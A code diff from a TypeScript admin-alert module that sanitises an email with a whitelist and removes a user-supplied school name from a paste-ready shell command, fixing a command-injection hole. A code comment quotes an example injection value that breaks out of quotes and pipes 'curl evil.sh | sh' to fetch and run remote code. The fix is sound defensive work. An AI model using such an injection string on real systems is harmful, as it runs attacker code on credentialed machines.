@@ -288,6 +288,18 @@ export function notifyAdminMarkUnfair(payload: {
 }
 
 /**
+ * Anything pasted into a shell must not be able to end the argument it sits in.
+ *
+ * Deliberately a whitelist: an address that does not look like an address is
+ * dropped entirely rather than escaped, because the only use for this value is
+ * a command line and a half-sanitised one is worse than an absent one.
+ */
+function shellSafe(value: string | null): string | null {
+  if (!value) return null
+  return /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(value) ? value : null
+}
+
+/**
  * A teacher has asked for their seat. This is the only alert in this file that
  * is a queue rather than an FYI — nothing happens for the teacher until someone
  * runs `pnpm teacher:grant --approve`, so the command to do it is in the body.
@@ -319,7 +331,14 @@ export function notifyAdminTeacherSeatRequest(payload: {
       '  pnpm teacher:grant --pending',
       '',
       'Approve (grants the seat and closes the request):',
-      `  pnpm teacher:grant --approve ${payload.accountEmail ?? '<email>'} "school: ${payload.schoolName}"`,
+      // The reason is NOT interpolated from the school name. This line is built
+      // to be pasted into a shell on a machine holding service-role credentials,
+      // and school_name is attacker-controlled: signup is open, and the field is
+      // only trimmed and length-capped, so `x"; curl evil.sh | sh; echo "` would
+      // otherwise produce a valid, paste-ready command. The reviewer reads the
+      // school above and the script fills the reason in from the stored request
+      // when none is given.
+      `  pnpm teacher:grant --approve ${shellSafe(payload.accountEmail) ?? '<email>'}`,
     ].join('\n'),
   })
 }
